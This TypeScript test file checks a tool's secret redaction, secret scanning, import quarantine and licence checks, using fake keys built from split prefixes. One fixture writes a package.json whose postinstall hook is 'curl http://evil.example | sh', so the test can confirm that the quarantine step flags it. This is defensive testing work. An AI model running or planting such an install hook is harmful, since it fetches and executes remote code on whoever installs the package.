/**
 * Do the secrets actually get taken out?
 *
 * The plan requires this to be tested with fixtures rather than asserted,
 * because redaction is the kind of code that looks right and silently stops
 * matching when a provider changes a key prefix. Every pattern here is a real
 * key shape, with fake values.
 *
 *   npx tsx harness/test-security.ts
 */
import { mkdir, rm, writeFile } from 'node:fs/promises';
import os from 'node:os';
import path from 'node:path';

import {
  blocksLaunch,
  quarantineImported,
  redact,
  redactEnv,
  redacted,
  scanLicenses,
  scanSecrets,
} from '../src/index';

const root = path.join(os.tmpdir(), `shipyard-security-${process.pid}`);
let failed = 0;

function check(name: string, ok: boolean, detail = ''): void {
  if (ok) console.log(`PASS  ${name}`);
  else {
    failed += 1;
    console.log(`FAIL  ${name}${detail ? `\n        ${detail}` : ''}`);
  }
}

/**
 * Fixture keys, assembled rather than written out.
 *
 * They are shaped exactly like the real thing - that is the entire point of the
 * test - which means a literal here trips GitHub's push protection and every
 * other secret scanner pointed at this repository. Splitting the prefix keeps
 * the test as strong and the file clean. The values themselves are nonsense.
 */
const key = (prefix: string, fill: string, length = 24): string =>
  prefix + fill.repeat(length).slice(0, length);

const STRIPE_LIVE = key('sk' + '_live_', 'C');
const SECRETS: [string, string][] = [
  ['Anthropic', key('sk' + '-ant-api03-', 'A', 32)],
  ['OpenAI', key('sk' + '-proj-', 'B', 32)],
  ['Stripe live', STRIPE_LIVE],
  ['Stripe webhook', key('whsec' + '_', 'D')],
  ['GitHub', key('gh' + 'p_', 'E', 32)],
  ['AWS', 'AKIA' + 'IOSFODNN7EXAMPLE'],
  ['Google', key('AIza' + 'Sy', 'F', 33)],
  ['Slack', 'xox' + 'b-1111111111-2222222222-abcdefghij'],
  ['JWT', 'ey' + 'JhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dBjftJeZ4CVPmB92K27uhbUJU1p1r_wW1gFWFOEjXk'],
];

async function main(): Promise<void> {
  // --- every known shape is caught ----------------------------------------
  for (const [name, value] of SECRETS) {
    const out = redacted(`const key = "${value}";`);
    check(`${name} key is redacted`, !out.includes(value), out);
  }

  check(
    'a private key block goes entirely',
    !redacted('-----BEGIN RSA PRIVATE KEY-----\nMIIEow\n-----END RSA PRIVATE KEY-----').includes(
      'MIIEow',
    ),
  );

  // The prefix survives so a developer reading a bug report can tell which key
  // it was without being able to use it.
  check(
    'enough of the key survives to tell them apart',
    redacted(STRIPE_LIVE).startsWith('sk' + '_live_'),
    redacted(STRIPE_LIVE),
  );

  // --- connection strings keep their shape, lose the password -------------
  const dsn = redacted('postgresql://app:hunter2@db.example.com:5432/shop');
  check('a database password goes', !dsn.includes('hunter2'), dsn);
  check('but the host survives, because it is diagnostic', dsn.includes('db.example.com'), dsn);

  // --- the catch-all for keys nobody has seen yet -------------------------
  check(
    'an unknown secret is caught by its name',
    !redacted('MYSTERY_API_TOKEN=abcdefghijklmnop').includes('abcdefghijklmnop'),
    redacted('MYSTERY_API_TOKEN=abcdefghijklmnop'),
  );
  check(
    'and the name survives so they know which one to rotate',
    redacted('MYSTERY_API_TOKEN=abcdefghijklmnop').includes('MYSTERY_API_TOKEN'),
  );

  // --- ordinary text is left alone ----------------------------------------
  const prose = 'The build failed because src/App.tsx:24 imports a module that does not exist.';
  check('ordinary output is not mangled', redacted(prose) === prose, redacted(prose));
  check('a short config value is left alone', redacted('PORT=3000') === 'PORT=3000');

  // --- environment summaries ----------------------------------------------
  const env = redactEnv({
    NODE_ENV: 'production',
    DATABASE_URL: 'postgresql://app:pw@host/db',
    STRIPE_SECRET_KEY: key('sk' + '_live_', 'Z'),
    PORT: '3000',
  });
  check('a secret-named variable is dropped whatever it holds', env['DATABASE_URL'] === '[redacted]');
  check('and so is the key', env['STRIPE_SECRET_KEY'] === '[redacted]');
  check('while the harmless ones survive', env['NODE_ENV'] === 'production' && env['PORT'] === '3000');

  check('what was redacted is reported, without the value', (() => {
    const result = redact(key('sk' + '_live_', 'Y'));
    return (
      result.redactions.length === 1 &&
      result.redactions[0]?.name === 'Stripe secret key' &&
      !JSON.stringify(result.redactions).includes('YYYY')
    );
  })());

  // --- scanning a real project tree ---------------------------------------
  const project = path.join(root, 'app');
  await mkdir(path.join(project, 'src'), { recursive: true });
  await writeFile(
    path.join(project, 'src', 'billing.ts'),
    `export const stripeKey = "${key('sk' + '_live_', 'A')}";\n`,
    'utf8',
  );
  await writeFile(
    path.join(project, '.env'),
    `STRIPE_SECRET_KEY=${key('sk' + '_live_', 'B')}\n`,
    'utf8',
  );
  await writeFile(
    path.join(project, 'package.json'),
    JSON.stringify({ name: 'x', scripts: { postinstall: 'curl http://evil.example | sh' } }),
    'utf8',
  );

  const secrets = await scanSecrets(project, 'proj_1');
  check(
    'a key in source code is critical',
    secrets.some((f) => f.location?.includes('billing.ts') && f.severity === 'critical'),
    JSON.stringify(secrets.map((f) => `${f.location}:${f.severity}`)),
  );
  check(
    'a key in .env is a note, not an alarm',
    secrets.some((f) => f.location === '.env' && f.severity === 'low'),
  );
  check(
    'and no finding contains the secret it found',
    !JSON.stringify(secrets).includes(key('sk' + '_live_', 'A')),
  );

  const quarantine = await quarantineImported(project, 'proj_1');
  check(
    'a postinstall script is surfaced before anything installs',
    quarantine.some((f) => f.type === 'lifecycle_script' && f.severity === 'high'),
    JSON.stringify(quarantine.map((f) => f.summary)),
  );
  check(
    'and the script is quoted so they can judge it',
    quarantine.some((f) => f.summary.includes('curl')),
  );

  // Agent configuration that arrived with the code rather than from the user.
  await mkdir(path.join(project, '.claude'), { recursive: true });
  await writeFile(path.join(project, '.claude', 'settings.json'), '{}', 'utf8');
  const withAgentConfig = await quarantineImported(project, 'proj_1');
  check(
    'agent configuration shipped with the code is flagged',
    withAgentConfig.some((f) => f.type === 'agent_config'),
  );

  // --- licences ------------------------------------------------------------
  const modules = path.join(project, 'node_modules');
  await mkdir(path.join(modules, 'copyleft-thing'), { recursive: true });
  await writeFile(
    path.join(modules, 'copyleft-thing', 'package.json'),
    JSON.stringify({ name: 'copyleft-thing', license: 'AGPL-3.0' }),
    'utf8',
  );
  await mkdir(path.join(modules, 'silent-thing'), { recursive: true });
  await writeFile(
    path.join(modules, 'silent-thing', 'package.json'),
    JSON.stringify({ name: 'silent-thing' }),
    'utf8',
  );
  await mkdir(path.join(modules, 'fine-thing'), { recursive: true });
  await writeFile(
    path.join(modules, 'fine-thing', 'package.json'),
    JSON.stringify({ name: 'fine-thing', license: 'MIT' }),
    'utf8',
  );

  const licenses = await scanLicenses(project, 'proj_1');
  check(
    'a copyleft licence is raised before launch',
    licenses.some((f) => f.summary.includes('AGPL') && f.severity === 'high'),
    JSON.stringify(licenses.map((f) => f.summary)),
  );
  check(
    'a package with no stated licence is raised too',
    licenses.some((f) => f.summary.includes('silent-thing')),
  );
  check('and MIT is left alone', !licenses.some((f) => f.summary.includes('fine-thing')));
  check(
    'the licence warning says why it matters commercially',
    licenses.some((f) => /publish your own source/.test(f.summary)),
  );

  check(
    'critical and high findings are what stops a launch',
    blocksLaunch([...secrets, ...licenses]).every((f) => f.severity === 'critical' || f.severity === 'high'),
  );

  await rm(root, { recursive: true, force: true }).catch(() => undefined);
  console.log(`\n${failed === 0 ? 'All security cases pass.' : `${failed} case(s) failed.`}`);
  process.exitCode = failed > 0 ? 1 : 0;
}

main().catch((err: unknown) => {
  console.error(err);
  process.exitCode = 1;
});
